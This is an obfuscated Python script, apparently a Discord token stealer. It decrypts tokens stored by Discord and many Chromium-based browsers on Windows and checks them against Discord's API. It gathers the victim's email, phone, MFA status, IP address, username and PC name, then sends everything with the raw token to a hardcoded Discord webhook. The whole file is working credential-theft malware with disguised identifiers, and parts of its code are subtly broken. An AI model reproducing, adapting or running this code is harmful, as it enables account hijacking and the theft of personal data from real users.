lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllllllII,llllllllllllIll,llllllllllllIlI,llllllllllllIIl=IndexError,abs,__name__,open,bool,len,PermissionError
from base64 import b64decode as IIlIlIllIIIlII
from Crypto.Cipher import AES as lIlIIIIlIIllII
from win32crypt import CryptUnprotectData as IIIIlllIlIIlll
from os import getlogin as IlIIIllIllIlll,listdir as IllllIlIlIIIIl
from json import loads as IlIllllIIIlIlI
from re import findall as IIlIIllIlIlllI
from urllib.request import Request as IlIlllIIlIllIl,urlopen as llllIlllllIIII
from subprocess import Popen as llIllIllllIlII,PIPE as IlIlIIIlIllIIl
import requests as lIlIlIIlIIIIII,json as IllllIlIIlIlII,os as llIIIIllllIIlI
from datetime import datetime as IllllIIlIlIllI
IIlIIllIIlIllIllll=[]
lllIlIlIlllIlIlIlI=[]
lllIllIIlIlllIllII=[]
def lIIlIlIlIIIIIlIIll(IlllIllIIlIIIIIIII,IlIIIIIlIIIIIIIIII):
    B=IlllIllIIlIIIIIIII;A=None
    try:return lIlIIIIlIIllII.new(IIIIlllIlIIlll(IlIIIIIlIIIIIIIIII,A,A,A,0)[1],lIlIIIIlIIllII.MODE_GCM,B[3:15]).lIIlIlIlIIIIIlIIll(B[15:])[:-16].decode()
    except:return'Error'
def IlIlllIIlIlllllIlI():
    A='None'
    try:A=llllIlllllIIII(IlIlllIIlIllIl('https://api.ipify.org')).read().decode().strip()
    except:pass
    return A
def lIIIIllllIIIllIllI():A=llIllIllllIlII('wmic csproduct get uuid',shell=True,stdin=IlIlIIIlIllIIl,stdout=IlIlIIIlIllIIl,stderr=IlIlIIIlIllIIl);return(A.stdout.read()+A.stderr.read()).decode().split('\n')[1]
def lIlIlIIlIIllIIIIll():
    T='%Y-%m-%dT%H:%M:%S';S='username';R='application/json';Q='Content-Type';L=[];M=[];A=llIIIIllllIIlI.getenv('LOCALAPPDATA');B=llIIIIllllIIlI.getenv('APPDATA');U=A+'\\Google\\Chrome\\User Data';V={'Discord':B+'\\discord','Discord Canary':B+'\\discordcanary','Lightcord':B+'\\Lightcord','Discord PTB':B+'\\discordptb','Opera':B+'\\Opera Software\\Opera Stable','Opera GX':B+'\\Opera Software\\Opera GX Stable','Amigo':A+'\\Amigo\\User Data','Torch':A+'\\Torch\\User Data','Kometa':A+'\\Kometa\\User Data','Orbitum':A+'\\Orbitum\\User Data','CentBrowser':A+'\\CentBrowser\\User Data','7Star':A+'\\7Star\\7Star\\User Data','Sputnik':A+'\\Sputnik\\Sputnik\\User Data','Vivaldi':A+'\\Vivaldi\\User Data\\Default','Chrome SxS':A+'\\Google\\Chrome SxS\\User Data','Chrome':U+'Default','Epic Privacy Browser':A+'\\Epic Privacy Browser\\User Data','Microsoft Edge':A+'\\Microsoft\\Edge\\User Data\\Defaul','Uran':A+'\\uCozMedia\\Uran\\User Data\\Default','Yandex':A+'\\Yandex\\YandexBrowser\\User Data\\Default','Brave':A+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium':A+'\\Iridium\\User Data\\Default'}
    for(W,E)in V.items():
        if not llIIIIllllIIlI.IlIlllllIllllIIlll.exists(E):continue
        try:
            with lllllllllllllII(E+f"\\Local State",'r')as C:X=IlIllllIIIlIlI(C.read())['os_crypt']['encrypted_key'];C.close()
        except:continue
        for C in IllllIlIlIIIIl(E+f"\\Local Storage\\leveldb\\"):
            if not C.endswith('.ldb')and C.endswith('.log'):continue
            else:
                try:
                    with lllllllllllllII(E+f"\\Local Storage\\leveldb\\{C}",'r',errors='ignore')as Y:
                        for N in Y.readlines():
                            N.strip()
                            for Z in IIlIIllIlIlllI('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',N):IIlIIllIIlIllIllll.append(Z)
                except llllllllllllIIl:continue
        for F in IIlIIllIIlIllIllll:
            if F.endswith('\\'):F.replace('\\','')
            elif F not in lllIlIlIlllIlIlIlI:lllIlIlIlllIlIlIlI.append(F)
        for a in lllIlIlIlllIlIlIlI:
            try:H=lIIlIlIlIIIIIlIIll(IIlIlIllIIIlII(a.split('dQw4w9WgXcQ:')[1]),IIlIlIllIIIlII(X)[5:])
            except lllllllllllllll=='Error':continue
            M.append(H)
            for O in M:
                if O not in L:
                    L.append(O);P={'Authorization':H,Q:R}
                    try:G=lIlIlIIlIIIIII.get('https://discordapp.com/api/v6/users/@me',headers=P)
                    except:continue
                    if G.status_code==200:
                        D=G.json();b=IlIlllIIlIlllllIlI();c=llIIIIllllIIlI.getenv('UserName');d=llIIIIllllIIlI.getenv('COMPUTERNAME');e=f"{D[S]}#{D['discriminator']}";f=D['id'];g=D['email'];h=D['phone'];i=D['mfa_enabled'];I=False;G=lIlIlIIlIIIIII.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers=P);J=G.json();I=llllllllllllIll(llllllllllllIlI(J)>0);K=0
                        if I:j=IllllIIlIlIllI.strptime(J[0]['current_period_end'].split('.')[0],T);k=IllllIIlIlIllI.strptime(J[0]['current_period_start'].split('.')[0],T);K=llllllllllllllI((k-j).days)
                        l=f"""**{e}** *({f})*

> :dividers: __Account Information__
\tEmail: `{g}`
\tPhone: `{h}`
\t2FA/MFA Enabled: `{i}`
\tNitro: `{I}`
\tExpires in: `{K if K else"None"} day(s)`

> :computer: __PC Information__
\tIP: `{b}`
\tUsername: `{c}`
\tPC Name: `{d}`
\tPlatform: `{W}`

> :piñata: __Token__
\t`{H}`

uwu""";m=IllllIlIIlIlII.dumps({'content':l,S:'uwu','avatar_url':'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:n={Q:R,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'};o=IlIlllIIlIllIl('https://discord.com/api/webhooks/1262040206702284941/6Id-v5cU-rE9UQYKU_wpwYxeNZKJB3XoBt51aTEfG29tZF_MgU8759wTPYoIxijUZhLU',data=m.encode(),headers=n);llllIlllllIIII(o)
                        except:continue
                else:continue
if lllllllllllllIl=='__main__':lIlIlIIlIIllIIIIll()
